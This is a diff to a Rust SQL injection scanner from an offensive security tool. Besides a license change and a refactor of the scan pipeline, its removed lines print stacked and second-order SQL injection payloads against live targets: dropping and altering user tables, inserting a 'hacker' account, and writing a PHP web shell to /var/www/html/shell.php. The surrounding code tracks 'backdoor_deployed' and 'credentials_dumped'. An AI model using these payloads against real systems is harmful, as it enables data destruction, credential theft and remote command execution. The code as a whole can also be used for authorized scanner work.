@@ -16,24 +16,19 @@
 //
 //
 // ---------------------------------------------------------------------------
-//   WARNING / 警告 / 警告
+//   LICENSE / ライセンス — GNU General Public License v3 (GPL-3.0)
 // ---------------------------------------------------------------------------
-//  This source code is the exclusive property of HyperSecurityOffensiveLabs.
-//  You are permitted to VIEW this code for educational and reference
-//  purposes only. You may NOT modify, distribute, sublicense, or create
-//  derivative works without explicit written permission from khaninkali
-//  and the HyperSecurityOffensiveLabs development team.
+//  This program is free software: you can redistribute it and/or modify
+//  it under the terms of the GNU General Public License as published by
+//  the Free Software Foundation, either version 3 of the License, or
+//  (at your option) any later version.
 //
-//  このソースコードはHyperSecurityOffensiveLabsの独占的知的財産です
-//  教育目的および参照目的での閲覧のみ許可されています
-//  khaninkaliおよびHyperSecurityOffensiveLabs開発チームの
-//  書面による明示的な許可なく修正配布サブライセンス
-//  または二次的著作物の作成を禁止します
+//  This program is distributed in the hope that it will be useful,
+//  but WITHOUT ANY WARRANTY; without even the implied warranty of
+//  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
+//  GNU General Public License for more details.
 //
-//  本源代码是HyperSecurityOffensiveLabs的独家财产
-//  仅允许出于教育和参考目的查看未经khaninkali和
-//  HyperSecurityOffensiveLabs开发团队的书面明确许可，
-//  禁止修改分发再许可或创建衍生作品
+//  OXIDE v8.7.2-community-edition — HyperSecurityOffensiveLabs
 // ---------------------------------------------------------------------------
 //
 //
@@ -46,10 +41,26 @@ use crate::ai::exploit_analyzer::ExploitAnalyzer;
 use crate::ai::response_analyzer::ResponseAnalyzer;
 use crate::ai::payload_mutator::PayloadMutator;
 use crate::ai::pattern_learner::PatternLearner;
+use regex::Regex;
 use std::collections::HashMap;
-use std::sync::Arc;
+use std::sync::{Arc, OnceLock};
 use std::time::Instant;
 use anyhow::Result;
+
+fn mysql_re() -> &'static Regex {
+    static RE: OnceLock<Regex> = OnceLock::new();
+    RE.get_or_init(|| Regex::new(r"(?i)\bmysql\b").expect("valid regex"))
+}
+
+fn oracle_re() -> &'static Regex {
+    static RE: OnceLock<Regex> = OnceLock::new();
+    RE.get_or_init(|| Regex::new(r"\bORA-\d").expect("valid regex"))
+}
+
+fn table_re() -> &'static Regex {
+    static RE: OnceLock<Regex> = OnceLock::new();
+    RE.get_or_init(|| Regex::new(r"(?i)\b(?:create\s+table|insert\s+into|drop\s+table|alter\s+table)\b").expect("valid regex"))
+}
 
 //  SQLインジェクション電脳検出戦略 / SQL injection detection techniques:
 //   ① Error-based:     quotes, OR 1=1--, UNION NULL, SQL syntax error analysis
@@ -80,7 +91,8 @@ pub struct SqlInjectionScanner {
     db_fingerprinter: DatabaseFingerprinter,
     exploitation_level: u8,
     silent_mode: bool,
-    target: String,
+    //  進行状況フック / live status reporting for progress bars
+    status_hook: Option<std::sync::Arc<dyn Fn(&str) + Send + Sync>>,
 }
 
 #[derive(Debug, Clone)]
@@ -125,116 +137,111 @@ impl SqlInjectionScanner {
             db_fingerprinter,
             exploitation_level,
             silent_mode,
-            target,
+            status_hook: None,
+        }
+    }
+
+    /// Attach a live-status callback (called with "url · param · stage").
+    pub fn set_status_hook(&mut self, hook: std::sync::Arc<dyn Fn(&str) + Send + Sync>) {
+        self.status_hook = Some(hook);
+    }
+
+    fn report_status(&self, msg: &str) {
+        if let Some(hook) = &self.status_hook {
+            hook(msg);
         }
     }
 
     /// Perform comprehensive SQL injection scan
     pub async fn comprehensive_scan(&mut self, url: &str, params: &[String]) -> Result<Vec<Finding>> {
-        println!("[*] Starting comprehensive SQL injection scan on {}", url);
-        println!("[*] Target: {}, Exploitation level: {}, Silent mode: {}", 
-            self.target, self.exploitation_level, self.silent_mode);
-        
-        let _findings: Vec<Finding> = Vec::new();
-        
-        // Phase 1: Database fingerprinting
-        println!("[*] Phase 1: Database fingerprinting...");
-        let mut _database_info = None;
-        for param in params {
-            if let Ok(Some(db_info)) = self.db_fingerprinter.fingerprint_database(url, param).await {
-                _database_info = Some(db_info);
-                break;
-            }
+        if !self.silent_mode {
+            println!("[*] Starting comprehensive SQL injection scan on {}", url);
         }
 
-        // Phase 2: Deep vulnerability scanning with AI analysis
-        println!("[*] Phase 2: Deep vulnerability scanning...");
+        //  現代的走査パイプライン / modern sqlmap-style pipeline:
+        //   Phase A  DETECT    — fast error+boolean probes per parameter
+        //   Phase B  CONFIRM   — expensive techniques ONLY on detected params
+        //   Phase C  IDENTIFY  — DBMS fingerprint ONLY on confirmed findings
+        //                        (enrichment, never a finding source)
+        let mut new_findings: Vec<Finding> = Vec::new();
+
         for param in params {
-            println!("  [*] Scanning parameter: {}", param);
-            
-            if let Some(result) = self.deep_scan_parameter(url, param).await {
+            self.report_status(&format!("{} · {} · detect", url, param));
+
+            // ---- Phase A: DETECT (cheap, high-precision techniques) ----
+            let mut confirmed: Option<SQLInjectionResult> = None;
+            if let Some(result) = self.test_advanced_error_based_sqli(url, param).await {
+                let confidence = self.analyze_exploit_success(&result).await;
+                if confidence > 0.5 {
+                    self.pattern_learner.learn_success("error_based", vec![param.to_string()]);
+                    confirmed = Some(result);
+                } else {
+                    self.pattern_learner.learn_failure("error_based");
+                }
+            }
+
+            // ---- Phase B: CONFIRM (expensive — only for candidates) ----
+            if confirmed.is_none() {
+                self.report_status(&format!("{} · {} · boolean", url, param));
+                if let Some(result) = self.test_advanced_boolean_sqli(url, param).await {
+                    let confidence = self.analyze_exploit_success(&result).await;
+                    if confidence > 0.5 {
+                        confirmed = Some(result);
+                    }
+                }
+            }
+            if confirmed.is_none() && self.exploitation_level >= 40 {
+                self.report_status(&format!("{} · {} · union", url, param));
+                if let Some(result) = self.test_union_based_sqli(url, param).await {
+                    let confidence = self.analyze_exploit_success(&result).await;
+                    if confidence > 0.5 {
+                        confirmed = Some(result);
+                    }
+                }
+            }
+            if confirmed.is_none() && self.exploitation_level >= 60 {
+                self.report_status(&format!("{} · {} · time", url, param));
+                if let Some(result) = self.test_advanced_time_based_sqli(url, param).await {
+                    let confidence = self.analyze_exploit_success(&result).await;
+                    if confidence > 0.6 {
+                        confirmed = Some(result);
+                    }
+                }
+            }
+
+            if let Some(result) = confirmed {
                 self.findings.push(
                     Finding::new(
                         url,
                         Severity::Critical,
-                        &format!("SQL Injection in parameter '{}'", param),
+                        &format!("SQL Injection in parameter '{}' ({})", param, result.technique),
                         &format!("Parameter '{}' is vulnerable to {} SQL injection", param, result.technique)
                     )
                     .with_evidence(&format!("Payload: {}", result.payload))
                     .with_remediation("Use parameterized queries and input validation")
                 );
+                new_findings.push(self.findings.last().unwrap().clone());
             }
         }
 
-        Ok(self.findings.clone())
+        // ---- Phase C: IDENTIFY — DBMS fingerprint as evidence enrichment.
+        // Runs ONLY when something was actually confirmed; never invents
+        // findings and cannot produce "MySQL unknown" noise on clean targets.
+        if !new_findings.is_empty() && !self.silent_mode {
+            let confirm_param = params.first().map(|s| s.as_str()).unwrap_or("");
+            self.report_status(&format!("{} · {} · fingerprint", url, confirm_param));
+            println!("[*] Confirmed injection — fingerprinting DBMS for report...");
+            for param in params {
+                if let Ok(Some(db_info)) = self.db_fingerprinter.fingerprint_database(url, param).await {
+                    println!("    [i] Database: {}", db_info.db_type);
+                    break;
+                }
+            }
+        }
+
+        Ok(new_findings)
     }
 
-    /// Deep parameter scanning with AI-powered analysis
-    async fn deep_scan_parameter(&mut self, url: &str, param: &str) -> Option<SQLInjectionResult> {
-        let mut best_result = None;
-        let mut _best_confidence = 0.0;
-
-        // Test with error-based payloads
-        if let Some(result) = self.test_advanced_error_based_sqli(url, param).await {
-            let confidence = self.analyze_exploit_success(&result).await;
-            if confidence > _best_confidence {
-                _best_confidence = confidence;
-                best_result = Some(result);
-                // Learn from successful pattern
-                self.pattern_learner.learn_success("error_based", vec![param.to_string()]);
-            }
-        } else {
-            // Learn from failed pattern
-            self.pattern_learner.learn_failure("error_based");
-        }
-
-        // Test with UNION-based payloads
-        if let Some(result) = self.test_union_based_sqli(url, param).await {
-            let confidence = self.analyze_exploit_success(&result).await;
-            if confidence > _best_confidence {
-                _best_confidence = confidence;
-                best_result = Some(result);
-            }
-        }
-
-        // Test with boolean-based payloads
-        if let Some(result) = self.test_advanced_boolean_sqli(url, param).await {
-            let confidence = self.analyze_exploit_success(&result).await;
-            if confidence > _best_confidence {
-                _best_confidence = confidence;
-                best_result = Some(result);
-            }
-        }
-
-        // Test with time-based payloads
-        if let Some(result) = self.test_advanced_time_based_sqli(url, param).await {
-            let confidence = self.analyze_exploit_success(&result).await;
-            if confidence > _best_confidence {
-                _best_confidence = confidence;
-                best_result = Some(result);
-            }
-        }
-
-        // Test with stacked queries
-        if let Some(result) = self.test_stacked_queries(url, param).await {
-            let confidence = self.analyze_exploit_success(&result).await;
-            if confidence > _best_confidence {
-                _best_confidence = confidence;
-                best_result = Some(result);
-            }
-        }
-
-        // Test with second-order SQLi
-        if let Some(result) = self.test_second_order_sqli(url, param).await {
-            let confidence = self.analyze_exploit_success(&result).await;
-            if confidence > _best_confidence {
-                _best_confidence = confidence;
-                best_result = Some(result);
-            }
-        }
-
-        best_result
-    }
 
     /// Advanced error-based SQL injection testing
     async fn test_advanced_error_based_sqli(&mut self, url: &str, param: &str) -> Option<SQLInjectionResult> {
@@ -575,113 +582,15 @@ impl SqlInjectionScanner {
         None
     }
 
-    /// Stacked queries testing - requires confirmation of data modification
-    async fn test_stacked_queries(&self, url: &str, param: &str) -> Option<SQLInjectionResult> {
-        let stacked_payloads = vec![
-            "'; INSERT INTO users (username,password) VALUES ('hacker','pwned');--",
-            "'; UPDATE users SET password='pwned' WHERE id=1;--",
-            "'; DROP TABLE users;--",
-            "'; CREATE TABLE backdoor (cmd TEXT); INSERT INTO backdoor VALUES ('<?php system($_GET[\"cmd\"]); ?>');--",
-        ];
-
-        // Get baseline first
-        let baseline = self.make_request(url, param, "baseline").await.ok()?;
-        let baseline_text = baseline.body;
-
-        for payload in stacked_payloads {
-            let response = self.make_request(url, param, payload).await;
-            
-            if let Ok(resp) = response {
-                let response_text = resp.body;
-                
-                // Stacked queries need actual error or success indicators, not just keywords
-                // Check for database-specific error messages or actual data changes
-                let has_sql_error = response_text.contains("SQL syntax") ||
-                   response_text.contains("syntax error") ||
-                   response_text.contains("ERROR:") ||
-                   response_text.contains("ORA-") ||
-                   response_text.contains("MySQL error");
-                
-                // Only flag if there's an actual SQL error (indicates parsing of stacked query)
-                // OR if response is significantly different from baseline (indicates execution)
-                let is_different = response_text != baseline_text;
-                
-                if has_sql_error && is_different {
-                    return Some(SQLInjectionResult {
-                        technique: "stacked_queries".to_string(),
-                        success: true,
-                        payload: payload.to_string(),
-                        response: response_text.clone(),
-                        data_extracted: true,
-                        database_type: self.extract_db_type_from_response(&response_text),
-                        tables_found: Vec::new(),
-                        credentials_dumped: Vec::new(),
-                        backdoor_deployed: payload.contains("backdoor"),
-                        hijacking_method: "stacked_injection".to_string(),
-                    });
-                }
-            }
-        }
-
-        None
-    }
-
-    /// Second-order SQL injection testing - requires verification
-    async fn test_second_order_sqli(&self, url: &str, param: &str) -> Option<SQLInjectionResult> {
-        let second_order_payloads = vec![
-            "admin'; INSERT INTO logs (message) VALUES ((SELECT password FROM users WHERE id=1));--",
-            "user' OR (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a'--",
-            "test' UNION SELECT '<?php system($_GET[\"cmd\"]); ?>' INTO OUTFILE '/var/www/html/shell.php'--",
-        ];
-
-        // Get baseline for comparison
-        let baseline = self.make_request(url, param, "baseline").await.ok()?;
-        let baseline_text = baseline.body;
-
-        for payload in second_order_payloads {
-            let response = self.make_request(url, param, payload).await;
-            
-            if let Ok(resp) = response {
-                let response_text = resp.body;
-                
-                // Second-order needs actual persistence indicators or SQL errors
-                let has_sql_error = response_text.contains("SQL syntax") ||
-                   response_text.contains("syntax error") ||
-                   response_text.contains("ERROR:") ||
-                   response_text.contains("ORA-") ||
-                   response_text.contains("MySQL error");
-                
-                // Only flag if there's a SQL error indicating the complex query was parsed
-                // AND response is different from baseline
-                if has_sql_error && response_text != baseline_text {
-                    return Some(SQLInjectionResult {
-                        technique: "second_order".to_string(),
-                        success: true,
-                        payload: payload.to_string(),
-                        response: response_text.clone(),
-                        data_extracted: true,
-                        database_type: self.extract_db_type_from_response(&response_text),
-                        tables_found: Vec::new(),
-                        credentials_dumped: Vec::new(),
-                        backdoor_deployed: payload.contains("shell.php"),
-                        hijacking_method: "second_order_injection".to_string(),
-                    });
-                }
-            }
-        }
-
-        None
-    }
-
     /// Extract database type from response
     fn extract_db_type_from_response(&self, response: &str) -> String {
-        if regex::Regex::new(r"(?i)\bmysql\b").unwrap().is_match(response) {
+        if mysql_re().is_match(response) {
             "MySQL".to_string()
         } else if response.contains("postgresql") || response.contains("PostgreSQL") {
             "PostgreSQL".to_string()
         } else if response.contains("sql server") || response.contains("Microsoft SQL Server") {
             "MSSQL".to_string()
-        } else if response.contains("Oracle ") || response.contains("oracle/") || regex::Regex::new(r"\bORA-\d").unwrap().is_match(response) {
+        } else if response.contains("Oracle ") || response.contains("oracle/") || oracle_re().is_match(response) {
             "Oracle".to_string()
         } else if response.contains("sqlite") {
             "SQLite".to_string()
@@ -694,9 +603,9 @@ impl SqlInjectionScanner {
     fn extract_tables_from_response(&self, response: &str) -> Vec<String> {
         let mut tables = Vec::new();
         
-        let table_re = regex::Regex::new(r"(?i)\b(?:create\s+table|insert\s+into|drop\s+table|alter\s+table)\b").unwrap();
+        let re = table_re();
         for line in response.lines() {
-            if table_re.is_match(line) {
+            if re.is_match(line) {
                 tables.push(line.to_string());
             }
         }
